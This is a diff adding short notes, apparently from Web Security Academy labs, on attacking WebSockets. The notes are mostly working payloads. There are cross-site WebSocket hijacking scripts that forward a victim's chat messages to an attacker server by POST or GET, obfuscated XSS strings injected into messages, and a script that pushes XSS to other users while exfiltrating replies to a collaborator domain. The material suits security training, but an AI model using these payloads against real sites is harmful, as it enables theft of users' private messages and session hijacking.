@@ -1,0 +1,43 @@
+WEBSOCKET hijacking:
+
+<script>
+    var ws = new WebSocket('wss://VULNERABLE-WEBSOCKET-URL');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://ATTACKER-SERVER', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+
+this will effectively do POST requests with any message that the user has been tricked to initiate with our CSRF
+
+modify so that the data is passed as GET params:
+<script>
+    var ws = new WebSocket('wss://0a91001304e242b0804b21f3000e00bb.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://exploit-0a3f0076046942ae807b203c012b00bb.exploit-server.net/?ev='+event.data, {method: 'GET', mode: 'no-cors'});
+    };
+</script>
+
+
+
+other exploitation ways of websockets are:
+injecting XSS into messages
+{"message":"Test<img src=x oNeRRoR=alert`1`>"}
+{"message":"<img src=x OnErRoR=&#97;&#108;&#101;&#114;&#116;(1)>"}
+
+
+inject XSS into messages of other users:
+<script>
+    var ws = new WebSocket('wss://0a97008101b00a8.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("{\"message\":\"<img src=x onerror=alert(1)>\"}");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://a8jc1jg75.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
